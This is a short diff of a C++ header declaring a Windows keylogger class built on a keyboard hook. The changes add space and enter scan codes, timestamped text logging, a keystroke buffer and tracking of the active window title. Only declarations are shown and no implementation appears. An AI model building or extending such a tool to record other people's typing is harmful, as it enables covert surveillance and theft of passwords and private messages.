@@ -7,12 +7,15 @@
 #include <iostream>
 #include <ctime>
 #include <fstream>
+#include <string>
 
-//Keyboard scan codes
+//Keyboard codes
 #define SC_CTRL 29
 #define SC_LSHIFT 42
 #define SC_ALT 56
 #define SC_RSHIFT 54
+#define SC_SPACE 57
+#define SC_ENTER 28
 
 
 class KeyLogger {
@@ -26,9 +29,6 @@ class KeyLogger {
 
     //starts logging keyboard input
     void listen();
-
-
-
 
     HHOOK getHook();
 
@@ -48,11 +48,12 @@ class KeyLogger {
 
     protected:
 
-    KeyLogger(std::string logFilePath = "out.csv");
+    KeyLogger(std::string logFilePath = "out.txt");
     ~KeyLogger();
 
-    //logs the given key
-    void log(DWORD key);
+	void log(std::string text);
+
+	std::string getTimeString();
 
     //singleton
     static KeyLogger* instance;
@@ -65,7 +66,10 @@ class KeyLogger {
     HHOOK hook;
 
     std::ofstream logFile;
-    std::string hostname;
+	std::string logFilePath;
+
+	std::string keyboardBuffer;
+	std::string activeWindowTitle;
 };
 
 #endif // H_KEYLOGGER
